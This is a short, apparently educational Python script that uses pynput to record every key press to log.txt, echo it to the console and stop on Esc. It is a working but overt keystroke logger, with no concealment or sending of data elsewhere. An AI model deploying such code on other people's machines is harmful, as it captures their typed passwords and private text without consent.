from pynput import keyboard
import logging


logging.basicConfig(filename="log.txt", level=logging.DEBUG, format='')

#if the key is a string then do that otherwise turn it into a string
def get_key_name(key):
    if isinstance(key, keyboard.KeyCode): #isinstance(object,type)
        return key.char
    else:
        return str(key)


def on_press(key):
    key_name = get_key_name(key)
    print('Key {} pressed.'.format(key_name))
    logging.log(10, key_name)
    if key_name == 'Key.esc':
        print('Exiting...')
        return False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()